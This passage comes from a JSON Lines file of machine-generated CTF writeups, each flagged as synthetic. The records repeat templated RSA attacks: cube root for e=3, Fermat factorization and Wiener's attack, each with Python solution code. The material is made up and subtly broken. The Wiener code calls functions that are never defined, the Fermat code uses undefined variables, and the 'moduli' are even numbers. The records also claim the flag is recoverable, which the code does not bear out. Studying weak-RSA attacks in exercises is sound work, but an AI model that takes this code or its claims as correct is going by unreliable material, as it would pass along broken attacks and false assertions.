long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 70400767233252712213317703814147814678886605173494466156991942820353820562418384624917609158019659028768845428410032907995463985715001256396962933038507929048946361512107987414669678531583183013349479819293453529316954035362139406637058130686717900056105556022115706218297138756157999831555750955186650\ne = 3\nc = 53995910242714642680389778085939637960589059830724467737721204970603310848291201852155468764438031478747087793943975225097116735845227794283474913753815358057049122350251271369515842415909353717321575541767935519750518802949691091738135828985071596481900463199059617069477823989853416020835212772356496\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/28", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825858", "synthetic": true}
{"id": "synthetic_rsa_029", "team": "synthetic_team_6", "event": "CTF_2024_Event_5", "challenge_name": "RSA Small Exponent Attack #30", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 33671650071038358803369486593282642548550989418538102012630412450247229087515025404707590059580964306860620542220957653355102029338694913492060416669032749559540458791335537466822617623337327687316923607482762568097550636948985914634583201927496668751566116967090431720335176316737841849027846577000752\ne = 3\nc = 28930974967515899737024939517238220962946220915007767171309993631542404872774462175751336914653375166067977382382473334385742483305940166989945622599803511571154092480273777309568803173019341323240523440132499106850698271187482670242152608147491012838783599305812576388808588884279571230857992588837121\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 33671650071038358803369486593282642548550989418538102012630412450247229087515025404707590059580964306860620542220957653355102029338694913492060416669032749559540458791335537466822617623337327687316923607482762568097550636948985914634583201927496668751566116967090431720335176316737841849027846577000752\ne = 3\nc = 28930974967515899737024939517238220962946220915007767171309993631542404872774462175751336914653375166067977382382473334385742483305940166989945622599803511571154092480273777309568803173019341323240523440132499106850698271187482670242152608147491012838783599305812576388808588884279571230857992588837121\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/29", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825879", "synthetic": true}
{"id": "synthetic_rsa_030", "team": "synthetic_team_8", "event": "CTF_2024_Event_14", "challenge_name": "RSA Fermat Factorization #31", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/30", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826063", "synthetic": true}
{"id": "synthetic_rsa_031", "team": "synthetic_team_10", "event": "CTF_2024_Event_4", "challenge_name": "RSA Fermat Factorization #32", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/31", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826089", "synthetic": true}
{"id": "synthetic_rsa_032", "team": "synthetic_team_9", "event": "CTF_2024_Event_8", "challenge_name": "RSA Wiener Attack #33", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/32", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826105", "synthetic": true}
{"id": "synthetic_rsa_033", "team": "synthetic_team_4", "event": "CTF_2024_Event_5", "challenge_name": "RSA Fermat Factorization #34", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/33", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826121", "synthetic": true}
{"id": "synthetic_rsa_034", "team": "synthetic_team_5", "event": "CTF_2024_Event_6", "challenge_name": "RSA Wiener Attack #35", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/34", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826137", "synthetic": true}
{"id": "synthetic_rsa_035", "team": "synthetic_team_3", "event": "CTF_2024_Event_17", "challenge_name": "RSA Wiener Attack #36", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/35", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826160", "synthetic": true}
{"id": "synthetic_rsa_036", "team": "synthetic_team_5", "event": "CTF_2024_Event_16", "challenge_name": "RSA Small Exponent Attack #37", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 53647466112043270787849819023463670837501883612831909005414565563954338598183019558476618294540905166254424349040726752665333062433828840450635968590834418320216818175504832103689640123894234613638543691924762813796833116820786219531307789303172088506799232882172859951639175477039152736892189249346282\ne = 3\nc = 22428870505699689459893392857136711761729109553351614912021422014252146954479684741160658973847314999229439310110953055427027111516757949858333634508359353104243624953148373829071297368611108523439329527359976203953719267246368440944557988603907252047262724310316146397093142773555059823584342021813732\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 53647466112043270787849819023463670837501883612831909005414565563954338598183019558476618294540905166254424349040726752665333062433828840450635968590834418320216818175504832103689640123894234613638543691924762813796833116820786219531307789303172088506799232882172859951639175477039152736892189249346282\ne = 3\nc = 22428870505699689459893392857136711761729109553351614912021422014252146954479684741160658973847314999229439310110953055427027111516757949858333634508359353104243624953148373829071297368611108523439329527359976203953719267246368440944557988603907252047262724310316146397093142773555059823584342021813732\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/36", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826194", "synthetic": true}
{"id": "synthetic_rsa_037", "team": "synthetic_team_9", "event": "CTF_2024_Event_6", "challenge_name": "RSA Fermat Factorization #38", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/37", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826208", "synthetic": true}
{"id": "synthetic_rsa_038", "team": "synthetic_team_8", "event": "CTF_2024_Event_19", "challenge_name": "RSA Fermat Factorization #39", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/38", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826222", "synthetic": true}
{"id": "synthetic_rsa_039", "team": "synthetic_team_5", "event": "CTF_2024_Event_5", "challenge_name": "RSA Fermat Factorization #40", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/39", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826235", "synthetic": true}
{"id": "synthetic_rsa_040", "team": "synthetic_team_6", "event": "CTF_2024_Event_1", "challenge_name": "RSA Fermat Factorization #41", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/40", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826250", "synthetic": true}
{"id": "synthetic_rsa_041", "team": "synthetic_team_5", "event": "CTF_2024_Event_9", "challenge_name": "RSA Fermat Factorization #42", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/41", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826264", "synthetic": true}
{"id": "synthetic_rsa_042", "team": "synthetic_team_8", "event": "CTF_2024_Event_10", "challenge_name": "RSA Fermat Factorization #43", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/42", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826278", "synthetic": true}
{"id": "synthetic_rsa_043", "team": "synthetic_team_4", "event": "CTF_2024_Event_8", "challenge_name": "RSA Small Exponent Attack #44", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 11706372768351567276955961247080231202479622007096001262662443037699607580401342322185082882279359325511792314918491422786628805196272277961214944689025896666541066266279245541144696567619467643106580378595662841491542707096277027746809512148188096519115694162282899544860865019817646518589141775151315\ne = 3\nc = 